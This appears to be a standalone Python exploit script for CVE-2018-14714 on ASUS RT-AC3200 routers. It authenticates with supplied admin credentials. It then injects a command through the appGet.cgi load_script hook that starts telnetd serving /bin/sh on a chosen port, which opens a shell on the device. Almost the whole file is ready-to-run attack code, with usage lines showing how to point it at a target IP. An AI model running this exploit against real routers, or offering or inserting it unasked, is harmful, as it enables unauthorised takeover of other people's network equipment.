#!/usr/bin/env python3

# Usage:
# ./asus_exploit.py <target host> <target port> <admin username> <admin password>
# ./asus_exploit.py 192.168.1.1 80 admin password

import requests
import base64
import sys


def ASUS_RT_AC3200_CVE_2018_14714(victim_ip):
    try:
        # perform RCE and check if payload sent successfully
        exploit_result = os_command_injection(victim_ip)
        if exploit_result:
            return 'CVE-2018-14714 exploit successful!  A telnet service has been started on your chosen port.'
        else:
            return 'CVE-2018-14714 exploit failed!'
    except KeyboardInterrupt:
        print('\n' + 'Program exiting...')
        sys.exit()


def os_command_injection(victim_ip):
    port = 80
    telnet_port = input("Enter port to start telnetd on: ")
    url = 'http://' + victim_ip
    username = input("Enter Asus Router Username: ")
    password = input("Enter Asus Router Password: ")
    credentials = username + ':' + password
    credentials = credentials.encode()

    try:
        # send a POST request and detect if payload is sent successfully
        s = requests.Session()

        s.post(url + '/login.cgi',
               headers={'Referer': url + '/Main_Login.asp'},
               data={'login_authorization': base64.b64encode(credentials)})

        response = s.get(
            url + '/appGet.cgi?hook=load_script("../usr/sbin/telnetd+-l+/bin/sh+-p+' + telnet_port + '")')

        if response.status_code == 200:
            return True
        else:
            return False
    except:
        e = sys.exc_info()[1]
        print("Error: %s" % e)
        return False
